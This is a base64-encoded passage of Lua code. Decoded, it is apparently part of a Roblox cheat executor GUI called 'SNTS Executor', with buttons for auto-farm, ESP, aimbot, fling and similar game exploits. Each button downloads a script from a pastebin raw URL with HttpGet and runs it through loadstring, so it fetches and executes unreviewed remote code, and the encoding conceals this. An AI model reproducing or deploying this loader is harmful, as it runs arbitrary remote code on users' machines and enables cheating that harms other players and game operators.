NsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQoJCWxhYmVsLlRleHQgPSAiTG9hZGluZy4uLiIKCQl0YXNrLnNwYXduKGZ1bmN0aW9uKCkKCQkJbG9jYWwgc3VjY2VzcywgcmVzcG9uc2UgPSBwY2FsbChmdW5jdGlvbigpCgkJCQlyZXR1cm4gZ2FtZTpIdHRwR2V0KHVybCkKCQkJZW5kKQoJCQlpZiBzdWNjZXNzIHRoZW4KCQkJCWxvY2FsIHJ1blN1Y2Nlc3MsIGVyciA9IHBjYWxsKGZ1bmN0aW9uKCkKCQkJCQlsb2Fkc3RyaW5nKHJlc3BvbnNlKSgpCgkJCQllbmQpCgkJCQlpZiBydW5TdWNjZXNzIHRoZW4KCQkJCQlsYWJlbC5UZXh0ID0gbmFtZSAuLiAiIgoJCQkJCXRhc2sud2FpdCgxLjUpCgkJCQkJbGFiZWwuVGV4dCA9IG5hbWUKCQkJCQktLSBwcmludCgiW1NOVFMgQXV0b0Zhcm1dIExvYWRlZDoiLCBuYW1lKQoJCQkJZWxzZQoJCQkJCWxhYmVsLlRleHQgPSAi4pqg77iPIEVycm9yIgoJCQkJCS0tIHdhcm4oIltTTlRTIEVSUk9SXSBGYWlsZWQgdG8gZXhlY3V0ZToiLCBuYW1lLCBlcnIpCgkJCQllbmQKCQkJZWxzZQoJCQkJbGFiZWwuVGV4dCA9ICJGYWlsZWQiCgkJCQktLSB3YXJuKCJbU05UUyBFUlJPUl0gRmFpbGVkIHRvIGZldGNoOiIsIG5hbWUpCgkJCWVuZAoJCWVuZCkKCWVuZCkKZW5kCgotLSBFYXN5LXRvLXVzZSB3cmFwcGVycwpmdW5jdGlvbiBhdXRvRmFybUJ1dHRvbihuYW1lLCB1cmwpCgljcmVhdGVBdXRvRmFybUJ1dHRvbihuYW1lLCB1cmwsIGZhbHNlKQplbmQKCmZ1bmN0aW9uIGF1dG9GYXJtQWRkb24obmFtZSwgdXJsKQoJY3JlYXRlQXV0b0Zhcm1CdXR0b24obmFtZSwgdXJsLCB0cnVlKQplbmQKCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KLS0vLyBbU05UUyBFWEVDVVRPUl0gQVVUTyBGQVJNIFNDUklQVCBMSVNUCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCmF1dG9GYXJtQWRkb24oIlVOSVZFUlNBTCBBVVRPIEZBUk0iLCAiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzRUTDl4a0ZCIikKYXV0b0Zhcm1BZGRvbigiUEFSVCBOQU1FIFZJRVdFUiIsICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvWHIyQWZjcGQiKSAKYXV0b0Zhcm1BZGRvbigiQk9YIEpPQiBBVVRPIEZBUk0iLCAiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L25oMlVRTGtaIikKYXV0b0Zhcm1BZGRvbigiTUlETklHSFQgQVVUTyBKT0IgQk9YIiwgImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9yZno5VFVyVCIpCmF1dG9GYXJtQWRkb24oIkJJTElCSUQgUlAgQVVUTyBMT09UIiwgImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9uMjloRXBzaCIpCmF1dG9GYXJtQWRkb24oIlVSQkFOIERFQ0FZIEFVVE8gVFJBUEhPVVNFIiwgImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9WZkU1M3dRTSIpCmF1dG9GYXJtQWRkb24oIkJBR09ORyBCQVJZTyBBVVRPIENPTlNFUlZFIiwgImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9TcVpXZmU1QiIpCmF1dG9GYXJtQWRkb24oIkJVSEFZIEtVTFVOR0FOIEFVVE8gRkFSTSIsICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvbkdHWUJjRlAiKQoKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQotLS8vIEFkZCBtb3JlIEF1dG9GYXJtIHNjcmlwdHMgZWFzaWx5OgotLSBhdXRvRmFybUJ1dHRvbigiTkVXIEFVVE8gRkFSTSIsICJodHRwczovL3lvdXItdXJsLWhlcmUiKQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2NyaXB0LkNNRC5QbGF5ZXJVdGlsaXRpZXMKRzJMWyIxNjQiXSA9IEluc3RhbmNlLm5ldygiSW1hZ2VMYWJlbCIsIEcyTFsiZjkiXSk7CkcyTFsiMTY0Il1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyIxNjQiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiMTY0Il1bIkFuY2hvclBvaW50Il0gPSBWZWN0b3IyLm5ldygwLjUsIDApOwpHMkxbIjE2NCJdWyJJbWFnZSJdID0gW1tyYnhhc3NldGlkOi8vNzIwMzc2Njc1NDE4ODBdXTsKRzJMWyIxNjQiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDU0OSwgMCwgMzYxKTsKRzJMWyIxNjQiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyIxNjQiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKRzJMWyIxNjQiXVsiTmFtZSJdID0gW1tQbGF5ZXJVdGlsaXRpZXNdXTsKRzJMWyIxNjQiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjUwMTA0LCAwLCAwLjMyNTE3LCAwKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TY3JpcHQuQ01ELlBsYXllclV0aWxpdGllcy5EaXNwbGF5TmFtZQpHMkxbIjE2NSJdID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiLCBHMkxbIjE2NCJdKTsKRzJMWyIxNjUiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbIjE2NSJdWyJUZXh0U2l6ZSJdID0gMjU7CkcyTFsiMTY1Il1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbIjE2NSJdWyJGb250RmFjZSJdID0gRm9udC5uZXcoW1tyYnhhc3NldDovL2ZvbnRzL2ZhbWlsaWVzL0dvdGhhbVNTbS5qc29uXV0sIEVudW0uRm9udFdlaWdodC5Cb2xkLCBFbnVtLkZvbnRTdHlsZS5Ob3JtYWwpOwpHMkxbIjE2NSJdWyJUZXh0Q29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyIxNjUiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKRzJMWyIxNjUiXVsiQW5jaG9yUG9pbnQiXSA9IFZlY3RvcjIubmV3KDAuNSwgMCk7CkcyTFsiMTY1Il1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAyMDAsIDAsIDUwKTsKRzJMWyIxNjUiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyIxNjUiXVsiVGV4dCJdID0gW1tQTEFZRVIgVVRJTElUSUVTXV07CkcyTFsiMTY1Il1bIk5hbWUiXSA9IFtbRGlzcGxheU5hbWVdXTsKRzJMWyIxNjUiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjUsIDAsIDAsIDApOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNjcmlwdC5DTUQuUGxheWVyVXRpbGl0aWVzLlNjcm9sbGluZ0ZyYW1lCkcyTFsiMTY2Il0gPSBJbnN0YW5jZS5uZXcoIlNjcm9sbGluZ0ZyYW1lIiwgRzJMWyIxNjQiXSk7CkcyTFsiMTY2Il1bIkFjdGl2ZSJdID0gdHJ1ZTsKRzJMWyIxNjYiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbIjE2NiJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyIxNjYiXVsiU2Nyb2xsQmFySW1hZ2VUcmFuc3BhcmVuY3kiXSA9IDE7CkcyTFsiMTY2Il1bIkFuY2hvclBvaW50Il0gPSBWZWN0b3IyLm5ldygwLjUsIDAuNSk7CkcyTFsiMTY2Il1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCA0NTEsIDAsIDIyOCk7CkcyTFsiMTY2Il1bIlNjcm9sbEJhckltYWdlQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNDEsIDI0MSwgMjQxKTsKRzJMWyIxNjYiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjUsIDAsIDAuNSwgMCk7CkcyTFsiMTY2Il1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiMTY2Il1bIlNjcm9sbEJhclRoaWNrbmVzcyJdID0gNTsKRzJMWyIxNjYiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TY3JpcHQuQ01ELlBsYXllclV0aWxpdGllcy5TY3JvbGxpbmdGcmFtZS5VSUxpc3RMYXlvdXQKRzJMWyIxNjciXSA9IEluc3RhbmNlLm5ldygiVUlMaXN0TGF5b3V0IiwgRzJMWyIxNjYiXSk7CkcyTFsiMTY3Il1bIkhvcml6b250YWxBbGlnbm1lbnQiXSA9IEVudW0uSG9yaXpvbnRhbEFsaWdubWVudC5DZW50ZXI7CkcyTFsiMTY3Il1bIlBhZGRpbmciXSA9IFVEaW0ubmV3KDAsIDYpOwpHMkxbIjE2NyJdWyJTb3J0T3JkZXIiXSA9IEVudW0uU29ydE9yZGVyLkxheW91dE9yZGVyOwoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2NyaXB0LkNNRC5QbGF5ZXJVdGlsaXRpZXMuVUlHcmFkaWVudApHMkxbIjE3NyJdID0gSW5zdGFuY2UubmV3KCJVSUdyYWRpZW50IiwgRzJMWyIxNjQiXSk7CkcyTFsiMTc3Il1bIlJvdGF0aW9uIl0gPSAtOTA7CkcyTFsiMTc3Il1bIkNvbG9yIl0gPSBDb2xvclNlcXVlbmNlLm5ld3tDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuMDAwLCBDb2xvcjMuZnJvbVJHQig1OCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC4yNjEsIENvbG9yMy5mcm9tUkdCKDgwLCAwLCAwKSksQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjYxOCwgQ29sb3IzLmZyb21SR0IoMTIwLCAwLCAwKSksQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjk4OCwgQ29sb3IzLmZyb21SR0IoMTcxLCAwLCAwKSksQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjk5NywgQ29sb3IzLmZyb21SR0IoMTk4LCAwLCAwKSksQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygxLjAwMCwgQ29sb3IzLmZyb21SR0IoMjU1LCAwLCAwKSl9OwoKCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KLS0vLyBbU05UUyBFWEVDVVRPUl0gUExBWUVSIFVUSUxJVElFUyBDT05ORUNURUQgU0NSSVBUIEJVVFRPTlMKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKbG9jYWwgSHR0cFNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIkh0dHBTZXJ2aWNlIikKbG9jYWwgUGxheWVyVXRpbGl0aWVzRnJhbWUgPSBHMkxbIjE2NCJdIC0tIG1haW4gY29udGFpbmVyCgotLSBLZWVwIGNvbnNpc3RlbnQgZGFyayByZWQgZ3JhZGllbnQgYmFja2dyb3VuZApsb2NhbCBHcmFkaWVudCA9IEluc3RhbmNlLm5ldygiVUlHcmFkaWVudCIsIFBsYXllclV0aWxpdGllc0ZyYW1lKQpHcmFkaWVudC5Sb3RhdGlvbiA9IC05MApHcmFkaWVudC5Db2xvciA9IENvbG9yU2VxdWVuY2UubmV3ewoJQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjAwMCwgQ29sb3IzLmZyb21SR0IoNTgsIDAsIDApKSwKCUNvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC4yNjEsIENvbG9yMy5mcm9tUkdCKDgwLCAwLCAwKSksCglDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuNjE4LCBDb2xvcjMuZnJvbVJHQigxMjAsIDAsIDApKSwKCUNvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC45ODgsIENvbG9yMy5mcm9tUkdCKDE3MSwgMCwgMCkpLAoJQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygxLjAwMCwgQ29sb3IzLmZyb21SR0IoMjU1LCAwLCAwKSkKfQoKLS0gQ3JlYXRlIHNjcm9sbGluZyBmcmFtZSBmb3IgYnV0dG9ucwpsb2NhbCBTY3JvbGxpbmdGcmFtZSA9IEluc3RhbmNlLm5ldygiU2Nyb2xsaW5nRnJhbWUiLCBQbGF5ZXJVdGlsaXRpZXNGcmFtZSkKU2Nyb2xsaW5nRnJhbWUuTmFtZSA9ICJVdGlsaXRpZXNMaXN0IgpTY3JvbGxpbmdGcmFtZS5BY3RpdmUgPSB0cnVlClNjcm9sbGluZ0ZyYW1lLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxClNjcm9sbGluZ0ZyYW1lLlNpemUgPSBVRGltMi5uZXcoMCwgNDUxLCAwLCAyMjgpClNjcm9sbGluZ0ZyYW1lLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgMCwgMC41LCAwKQpTY3JvbGxpbmdGcmFtZS5BbmNob3JQb2ludCA9IFZlY3RvcjIubmV3KDAuNSwgMC41KQpTY3JvbGxpbmdGcmFtZS5Cb3JkZXJTaXplUGl4ZWwgPSAwClNjcm9sbGluZ0ZyYW1lLlNjcm9sbEJhclRoaWNrbmVzcyA9IDUKU2Nyb2xsaW5nRnJhbWUuU2Nyb2xsQmFySW1hZ2VUcmFuc3BhcmVuY3kgPSAxCgpsb2NhbCBMYXlvdXQgPSBJbnN0YW5jZS5uZXcoIlVJTGlzdExheW91dCIsIFNjcm9sbGluZ0ZyYW1lKQpMYXlvdXQuSG9yaXpvbnRhbEFsaWdubWVudCA9IEVudW0uSG9yaXpvbnRhbEFsaWdubWVudC5DZW50ZXIKTGF5b3V0LlBhZGRpbmcgPSBVRGltLm5ldygwLCA2KQpMYXlvdXQuU29ydE9yZGVyID0gRW51bS5Tb3J0T3JkZXIuTGF5b3V0T3JkZXIKCi0tIEhlbHBlciBmdW5jdGlvbiBmb3IgYnV0dG9uIGNyZWF0aW9uCmxvY2FsIGZ1bmN0aW9uIGJ1dHRvbihuYW1lLCB1cmwpCglsb2NhbCBidG4gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQoJYnRuLlNpemUgPSBVRGltMi5uZXcoMCwgMzYwLCAwLCA0OSkKCWJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoNDAsIDQwLCA0MCkKCWJ0bi5Cb3JkZXJTaXplUGl4ZWwgPSAwCglidG4uVGV4dCA9ICIiCglidG4uUGFyZW50ID0gU2Nyb2xsaW5nRnJhbWUKCWJ0bi5aSW5kZXggPSAxCgoJbG9jYWwgY29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIsIGJ0bikKCglsb2NhbCBsYWJlbCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIiwgYnRuKQoJbGFiZWwuQW5jaG9yUG9pbnQgPSBWZWN0b3IyLm5ldygwLjUsIDAuNSkKCWxhYmVsLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgMCwgMC41LCAwKQoJbGFiZWwuU2l6ZSA9IFVEaW0yLm5ldygwLCAzMDAsIDAsIDQwKQoJbGFiZWwuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKCWxhYmVsLlRleHQgPSBuYW1lCglsYWJlbC5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKCWxhYmVsLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQoJbGFiZWwuVGV4dFNjYWxlZCA9IHRydWUKCWxhYmVsLlpJbmRleCA9IDIKCglidG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCgkJbGFiZWwuVGV4dCA9ICJMb2FkaW5nLi4uIgoJCXRhc2suc3Bhd24oZnVuY3Rpb24oKQoJCQlsb2NhbCBzdWNjZXNzLCByZXNwb25zZSA9IHBjYWxsKGZ1bmN0aW9uKCkKCQkJCXJldHVybiBnYW1lOkh0dHBHZXQodXJsKQoJCQllbmQpCgkJCWlmIHN1Y2Nlc3MgdGhlbgoJCQkJbG9jYWwgb2ssIGVyciA9IHBjYWxsKGZ1bmN0aW9uKCkKCQkJCQlsb2Fkc3RyaW5nKHJlc3BvbnNlKSgpCgkJCQllbmQpCgkJCQlpZiBvayB0aGVuCgkJCQkJbGFiZWwuVGV4dCA9IG5hbWUgLi4gIiIKCQkJCQl0YXNrLndhaXQoMS41KQoJCQkJCWxhYmVsLlRleHQgPSBuYW1lCgkJCQllbHNlCgkJCQkJbGFiZWwuVGV4dCA9ICLimqDvuI8gRXJyb3IiCgkJCQkJLS0gd2FybigiW1NOVFMgRVJST1JdIFBsYXllclV0aWxpdGllcyBleGVjdXRpb24gZmFpbGVkOiIsIG5hbWUsIGVycikKCQkJCWVuZAoJCQllbHNlCgkJCQlsYWJlbC5UZXh0ID0gIkZhaWxlZCIKCQkJCS0tIHdhcm4oIltTTlRTIEVSUk9SXSBQbGF5ZXJVdGlsaXRpZXMgbG9hZCBmYWlsZWQ6IiwgbmFtZSkKCQkJZW5kCgkJZW5kKQoJZW5kKQplbmQKCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KLS0vLyBbU05UUyBFWEVDVVRPUl0gUExBWUVSIFVUSUxJVElFUyBTQ1JJUFQgTElTVAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgpidXR0b24oIkJPT1NUIEZQUyArIE5WSURJQSBHUkFQSElDUyIsICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvajhVWGRHdGkiKQpidXR0b24oIkhJR0hMSUdIVCBQTEFZRVJTIiwgImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9YWmZrYVh6ciIpCmJ1dHRvbigiRVNQIiwgImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9WdkJoWDRNRSIpCmJ1dHRvbigiQklHIEhFQUQiLCAiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3JNVjkwM2k1IikKYnV0dG9uKCJBSU1CT1QgUEMiLCAiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1ZVQTFGaHRtIikKYnV0dG9uKCJBSU1CT1QgREVURUNUT1IiLCAiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzFUTU1rNFkzIikKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TY3JpcHQuQ01ELkNhcnJ5QnJpbmdGbGluZwpHMkxbIjE3OCJdID0gSW5zdGFuY2UubmV3KCJJbWFnZUxhYmVsIiwgRzJMWyJmOSJdKTsKRzJMWyIxNzgiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbIjE3OCJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyIxNzgiXVsiQW5jaG9yUG9pbnQiXSA9IFZlY3RvcjIubmV3KDAuNSwgMCk7CkcyTFsiMTc4Il1bIkltYWdlIl0gPSBbW3JieGFzc2V0aWQ6Ly83MjAzNzY2NzU0MTg4MF1dOwpHMkxbIjE3OCJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgNTQ5LCAwLCAzMTUpOwpHMkxbIjE3OCJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbIjE3OCJdWyJCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5Il0gPSAxOwpHMkxbIjE3OCJdWyJOYW1lIl0gPSBbW0NhcnJ5QnJpbmdGbGluZ11dOwpHMkxbIjE3OCJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuNSwgMCwgMC42MjY1NCwgMCk7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2NyaXB0LkNNRC5DYXJyeUJyaW5nRmxpbmcuRGlzcGxheU5hbWUKRzJMWyIxNzkiXSA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIiwgRzJMWyIxNzgiXSk7CkcyTFsiMTc5Il1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyIxNzkiXVsiVGV4dFNpemUiXSA9IDI1OwpHMkxbIjE3OSJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyIxNzkiXVsiRm9udEZhY2UiXSA9IEZvbnQubmV3KFtbcmJ4YXNzZXQ6Ly9mb250cy9mYW1pbGllcy9Hb3RoYW1TU20uanNvbl1dLCBFbnVtLkZvbnRXZWlnaHQuQm9sZCwgRW51bS5Gb250U3R5bGUuTm9ybWFsKTsKRzJMWyIxNzkiXVsiVGV4dENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiMTc5Il1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDE7CkcyTFsiMTc5Il1bIkFuY2hvclBvaW50Il0gPSBWZWN0b3IyLm5ldygwLjUsIDApOwpHMkxbIjE3OSJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMjAwLCAwLCA1MCk7CkcyTFsiMTc5Il1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiMTc5Il1bIlRleHQiXSA9IFtbQ0FSUlksIEJSSU5HICYgRkxJTkddXTsKRzJMWyIxNzkiXVsiTmFtZSJdID0gW1tEaXNwbGF5TmFtZV1dOwpHMkxbIjE3OSJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuNSwgMCwgMCwgMCk7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2NyaXB0LkNNRC5DYXJyeUJyaW5nRmxpbmcuU2Nyb2xsaW5nRnJhbWUKRzJMWyIxN2EiXSA9IEluc3RhbmNlLm5ldygiU2Nyb2xsaW5nRnJhbWUiLCBHMkxbIjE3OCJdKTsKRzJMWyIxN2EiXVsiQWN0aXZlIl0gPSB0cnVlOwpHMkxbIjE3YSJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiMTdhIl1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbIjE3YSJdWyJTY3JvbGxCYXJJbWFnZVRyYW5zcGFyZW5jeSJdID0gMTsKRzJMWyIxN2EiXVsiQW5jaG9yUG9pbnQiXSA9IFZlY3RvcjIubmV3KDAuNSwgMC41KTsKRzJMWyIxN2EiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDQ1MywgMCwgMTU5KTsKRzJMWyIxN2EiXVsiU2Nyb2xsQmFySW1hZ2VDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI0MSwgMjQxLCAyNDEpOwpHMkxbIjE3YSJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuNSwgMCwgMC41LCAwKTsKRzJMWyIxN2EiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyIxN2EiXVsiU2Nyb2xsQmFyVGhpY2tuZXNzIl0gPSA1OwpHMkxbIjE3YSJdWyJCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5Il0gPSAxOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNjcmlwdC5DTUQuQ2FycnlCcmluZ0ZsaW5nLlNjcm9sbGluZ0ZyYW1lLlVJTGlzdExheW91dApHMkxbIjE3YiJdID0gSW5zdGFuY2UubmV3KCJVSUxpc3RMYXlvdXQiLCBHMkxbIjE3YSJdKTsKRzJMWyIxN2IiXVsiSG9yaXpvbnRhbEFsaWdubWVudCJdID0gRW51bS5Ib3Jpem9udGFsQWxpZ25tZW50LkNlbnRlcjsKRzJMWyIxN2IiXVsiUGFkZGluZyJdID0gVURpbS5uZXcoMCwgNik7CkcyTFsiMTdiIl1bIlNvcnRPcmRlciJdID0gRW51bS5Tb3J0T3JkZXIuTGF5b3V0T3JkZXI7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2NyaXB0LkNNRC5DYXJyeUJyaW5nRmxpbmcuU2Nyb2xsaW5nRnJhbWUuVGV4dEJ1dHRvbi5VSUNvcm5lcgpHMkxbIjE3ZCJdID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIsIEcyTFsiMTdjIl0pOwoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2NyaXB0LkNNRC5DYXJyeUJyaW5nRmxpbmcuVUlHcmFkaWVudApHMkxbIjE4YiJdID0gSW5zdGFuY2UubmV3KCJVSUdyYWRpZW50IiwgRzJMWyIxNzgiXSk7CkcyTFsiMThiIl1bIlJvdGF0aW9uIl0gPSAtOTA7CkcyTFsiMThiIl1bIkNvbG9yIl0gPSBDb2xvclNlcXVlbmNlLm5ld3tDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuMDAwLCBDb2xvcjMuZnJvbVJHQig1OCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC4yNjEsIENvbG9yMy5mcm9tUkdCKDgwLCAwLCAwKSksQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjYxOCwgQ29sb3IzLmZyb21SR0IoMTIwLCAwLCAwKSksQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjk4OCwgQ29sb3IzLmZyb21SR0IoMTcxLCAwLCAwKSksQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjk5NywgQ29sb3IzLmZyb21SR0IoMTk4LCAwLCAwKSksQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygxLjAwMCwgQ29sb3IzLmZyb21SR0IoMjU1LCAwLCAwKSl9OwoKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQotLS8vIFtTTlRTIEVYRUNVVE9SXSBDQVJSWSwgQlJJTkcgJiBGTElORyBDT05ORUNURUQgU0NSSVBUIEJVVFRPTlMKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKbG9jYWwgSHR0cFNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIkh0dHBTZXJ2aWNlIikKbG9jYWwgQ2FycnlCcmluZ0ZsaW5nRnJhbWUgPSBHMkxbIjE3OCJdIC0tIG1haW4gY29udGFpbmVyCgotLSBLZWVwIGNvbnNpc3RlbnQgZGFyayByZWQgZ3JhZGllbnQgYmFja2dyb3VuZApsb2NhbCBHcmFkaWVudCA9IEluc3RhbmNlLm5ldygiVUlHcmFkaWVudCIsIENhcnJ5QnJpbmdGbGluZ0ZyYW1lKQpHcmFkaWVudC5Sb3RhdGlvbiA9IC05MApHcmFkaWVudC5Db2xvciA9IENvbG9yU2VxdWVuY2UubmV3ewoJQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjAwMCwgQ29sb3IzLmZyb21SR0IoNTgsIDAsIDApKSwKCUNvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC4yNjEsIENvbG9yMy5mcm9tUkdCKDgwLCAwLCAwKSksCglDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuNjE4LCBDb2xvcjMuZnJvbVJHQigxMjAsIDAsIDApKSwKC